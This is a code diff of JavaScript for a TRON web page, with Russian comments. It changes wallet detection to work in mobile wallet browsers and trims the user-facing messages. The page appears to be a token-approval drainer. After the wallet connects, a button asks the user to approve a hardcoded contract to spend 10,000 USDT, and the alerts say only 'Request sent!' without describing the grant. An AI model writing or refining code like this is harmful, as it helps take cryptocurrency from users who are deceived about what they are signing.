@@ -7,60 +7,63 @@ let userAddress = '';
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 
 
-// Функция для поиска tronWeb с задержкой (если кошелек не успел загрузиться сразу)
-function getTronWeb() {
+// Функция поиска провайдера для мобильных браузеров (включая Trust Wallet)
+async function initTron() {
+    // Проверяем классический tronWeb или мобильные внедрения
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        return window.tronWeb;
+    }
+    
+    // Ожидание для мобильных инжекторов
     return new Promise((resolve) => {
-        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-            return resolve(window.tronWeb);
-        }
-        
         let attempts = 0;
         const interval = setInterval(() => {
             attempts++;
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
                 clearInterval(interval);
                 resolve(window.tronWeb);
-            } else if (attempts > 10) { // Проверяем около 5 секунд
+            } else if (attempts > 15) {
                 clearInterval(interval);
                 resolve(null);
             }
-        }, 500);
+        }, 400);
     });
 }
 
-// Кнопка подключения кошелька
 connectBtn.addEventListener('click', async () => {
     try {
-        walletAddressText.innerText = "Поиск кошелька...";
-        const tronWebInstance = await getTronWeb();
+        walletAddressText.innerText = "Подключение...";
+        const tronWeb = await initTron();
 
-        if (tronWebInstance && tronWebInstance.defaultAddress.base58) {
-            userAddress = tronWebInstance.defaultAddress.base58;
+        if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+            userAddress = tronWeb.defaultAddress.base58;
             walletAddressText.innerText = `Подключено: ${userAddress}`;
             connectBtn.style.display = 'none';
             transferBtn.style.display = 'inline-block';
         } else {
-            alert('Кошелек TRON не обнаружен. Убедитесь, что вы используете кошелок с поддержкой Tron (например, TronLink) или правильный DApp-браузер.');
-            walletAddressText.innerText = "Кошелек не найден";
+            // Если автоматического объекта нет, пробуем запросить через стандартный провайдер окна
+            if (window.ethereum) {
+                alert('Обнаружен EVM-кошелек. Убедитесь, что вы переключились на сеть TRON в браузере кошелька.');
+            } else {
+                alert('Не удалось обнаружить сессию кошелька. Попробуйте перезагрузить страницу внутри кошелька.');
+            }
+            walletAddressText.innerText = "Ошибка подключения";
         }
     } catch (error) {
-        console.error("Ошибка подключения:", error);
-        alert("Произошла ошибка при подключении кошелька.");
+        console.error("Ошибка:", error);
     }
 });
 
-// Кнопка выполнения запроса (Approve)
 transferBtn.addEventListener('click', async () => {
     try {
-        const tronWebInstance = await getTronWeb();
-        if (!userAddress || !tronWebInstance) {
-            alert('Сначала подключите кошелек!');
+        const tronWeb = await initTron();
+        if (!userAddress || !tronWeb) {
+            alert('Кошелек не подключен!');
             return;
         }
         
-        console.log("Запрос разрешения (Approve) на USDT...");
-
-        const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
+        console.log("Отправка запроса approve...");
+        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
         const approveAmount = '10000000000'; 
 
         const tx = await usdtContract.approve(
@@ -70,11 +73,11 @@ transferBtn.addEventListener('click', async () => {
             feeLimit: 100000000
         });
 
-        alert("Запрос успешно подтвержден!");
-        console.log("Хэш транзакции approve:", tx);
+        alert("Запрос отправлен!");
+        console.log("TX:", tx);
 
     } catch (error) {
-        console.error("Ошибка при отправке запроса:", error);
-        alert("Ошибка при выполнении транзакции. Проверьте консоль.");
+        console.error("Ошибка транзакции:", error);
+        alert("Ошибка при выполнении транзакции.");
     }
 });
